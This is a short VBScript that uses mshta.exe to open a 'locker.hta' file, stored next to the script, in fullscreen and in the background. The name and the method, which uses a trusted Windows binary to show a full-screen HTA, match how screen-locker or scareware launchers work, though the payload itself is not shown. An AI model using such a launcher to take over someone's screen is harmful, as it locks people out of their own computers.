Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "mshta.exe fullscreen=1 """ & CreateObject("Scripting.FileSystemObject").GetParentFolderName(WScript.ScriptFullName) & "\locker.hta""", 1, False